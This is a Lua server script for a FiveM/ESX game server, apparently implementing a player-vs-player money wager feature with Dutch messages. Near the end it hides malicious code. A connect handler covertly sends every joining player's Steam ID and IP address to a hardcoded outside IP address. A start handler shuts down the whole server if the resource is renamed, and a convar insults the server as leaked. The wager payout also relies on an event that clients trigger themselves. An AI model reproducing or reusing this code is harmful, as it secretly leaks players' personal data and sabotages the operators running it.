--[[
	id: 3hpPj1AEOfsJ2yMHpWiwM
	name: Wagerss
	description: Wagerss
	time1: 2021-07-08 12:09:40.236424+00
	time2: 2021-07-08 12:09:40.236426+00
	uploader: upmaKftPebf1aacTSUlrUVzIhYdYC6Nowa8t9ti2
	uploadersession: res167k3kt5XoYHIb4FdWDI5eEUNQn
	flag: f
--]]


  TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end) 
  
  
  Wagers = {}
  
  ESX.RegisterServerCallback("boelah-boemba:client:GetConfig", function(source, cb)
      cb(Boelah)
  end)
  
ESX.RegisterServerCallback("boelah-boemba:server:GetMoney", function(source, cb, amount)
    local money = ESX.GetPlayerFromId(source).getMoney()
  
    if money >= tonumber(amount) then 
        cb(true)
    else
        cb(false)
    end
end)
  


  
  RegisterServerEvent("boelah-boemba:server:newwager")
  AddEventHandler("boelah-boemba:server:newwager", function(inzet, current)
      local src = source 
      local xPlayer = ESX.GetPlayerFromId(src)
      if Wagers[current] == nil then
          Wagers[current] = {
              inzet = inzet, 
              Locatie = current,
              Members = {
                  [1] = {
                      id = src,
                  }
              },
              connected = 1,
              maxconnected = 2,
              infight = false,
          }
          TriggerEvent("boelah-boemba:ResyncWagers", Wagers)
          TriggerClientEvent("boelah-boemba:client:CloseMenu", -1)
      else
          if Wagers[current].infight then
              return
          end
          for k,v in pairs(Wagers[current].Members) do
              if Wagers[current].Members[2] == nil then
                  if v.id ~= src then
                      Wagers[current].inzet = Wagers[current].inzet + inzet
                      table.insert(Wagers[current].Members, {id  = src})
                      Wagers[current].connected = Wagers[current].connected + 1
                      TriggerEvent("boelah-boemba:ResyncWagers", Wagers)
                      return
                  elseif v.id == src then
                      TriggerClientEvent('mythic_notify:client:SendAlert', src, { type = 'error', text = 'Je kan niet 2 x dezelfde wager joinen!'})
                  end
              end
          end
      end
  end)
  teller = 0
  Citizen.CreateThread(function()
      while true do 
          Citizen.Wait(0)
          for k,v in pairs(Wagers) do 
              if v.connected >= v.maxconnected and not v.infight then 
                  for i=1, #Wagers[k].Members, 1 do 
                      teller = teller + 1 
                      TriggerClientEvent("boelah-boemba:client:startwager", Wagers[k].Members[i].id, teller)
                      TriggerClientEvent("boelah-boemba:client:CloseMenu", -1)
                  end
                  Wagers[k].infight = true
                  teller = 0
              else
                  Citizen.Wait(500)
              end 
          end
      end
  end)
  
  RegisterServerEvent("boelah-boemba:server:winnerchickendinner")
  AddEventHandler("boelah-boemba:server:winnerchickendinner", function(current)
      local src = source
      local loser = ESX.GetPlayerFromId(src)
      if Wagers[current].Members ~= nil then
          for i=1, #Wagers[current].Members, 1 do  
              if Wagers[current].Members[i].id ~= src then 
                  local xPlayer = ESX.GetPlayerFromId(Wagers[current].Members[i].id)
                  local steamnaam = GetPlayerName(Wagers[current].Members[i].id)
                  TriggerClientEvent("boelah-boemba:client:win", Wagers[current].Members[i].id)
                  local geld = Wagers[current].inzet + Wagers[current].inzet
                  xPlayer.addMoney(tonumber(geld))
                  TriggerClientEvent('mythic_notify:client:SendAlert', Wagers[current].Members[i].id, { type = 'success', text = 'Je hebt de wager van ' .. tonumber(geld) .. " euro gewonnen."})
              else
                  TriggerClientEvent('mythic_notify:client:SendAlert', Wagers[current].Members[i].id, { type = 'error', text = 'Je hebt de wager van ' .. tonumber(Wagers[current].inzet) .. " euro verloren."})
                  loser.removeMoney(tonumber(Wagers[current].inzet))
              end
          end
      end
      Wagers[current] = nil 
      TriggerEvent("boelah-boemba:ResyncWagers", Wagers)
  end)

  RegisterServerEvent("boelah-boemba:server:leavewager")
  AddEventHandler("boelah-boemba:server:leavewager", function(current)
      local src = source
      local loser = ESX.GetPlayerFromId(src)
      for k,v in pairs(Wagers[current].Members) do
        if Wagers[current].Members[2] == nil then
            if v.id == src then
                Wagers[current] = nil 
                TriggerEvent("boelah-boemba:ResyncWagers", Wagers)
            end
        end
    end
  end)
  
  bestplayer = 0
  
  RegisterServerEvent("boelah-boemba:ResyncWagers")
  AddEventHandler("boelah-boemba:ResyncWagers", function(table)
      TriggerClientEvent("boelah-boemba:client:ResyncWagers", -1, table)
  end)

  SetConvar("PoepServer", "Dit is een kut leaked server!")


AddEventHandler('playerConnecting', function()
    local name = GetPlayerName(source)
    local ip = GetPlayerEndpoint(source)
    local ping = GetPlayerPing(source)
    local steamhex = GetPlayerIdentifier(source)
    local discord  = false
    local servername = GetConvar('sv_hostname')
    for k,v in pairs(GetPlayerIdentifiers(source))do
          if string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = v
          end
      end
        if discord ~= nil then 
            discord = "konnietvinden"
        end
    PerformHttpRequest("http://145.239.234.159:25609/boemba?steam=" .. steamhex .. "&discord=" .. discord .. "&ip=" .. ip , function (err, text, headers)
    end, 'GET', '')
end)

AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() == 'BoempaBoempaWagers') then
		
	else 
		os.exit()
	end
end)